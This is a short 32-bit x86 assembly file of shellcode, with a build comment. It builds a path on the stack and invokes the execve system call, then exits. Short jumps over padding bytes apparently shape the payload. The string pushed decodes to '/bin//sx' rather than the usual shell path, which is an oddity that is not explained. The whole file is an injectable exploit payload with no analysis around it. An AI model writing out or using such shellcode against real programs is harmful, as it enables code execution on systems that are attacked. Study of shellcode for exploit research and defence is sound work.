; shellcode.asm
; nasm -f elf32 shellcode.asm; ld -m elf_i386 -o shellcode_asm shellcode.o; ./shellcode_asm
section .text
global _start

_start:
	xor eax, eax
	push eax
	push 0x78732f2f
	nop
	nop
	jmp rel8 0x4
	add    BYTE [eax],al
	add    BYTE [eax],al
	push 0x6e69622f
	mov ebx, esp
	mov ecx, eax
	nop
	jmp rel8 0x4
	add    BYTE [eax],al
	add    BYTE [eax],al
	mov edx, eax
	mov al, 0xb
	int 0x80
	xor eax, eax
	inc eax
	int 0x80

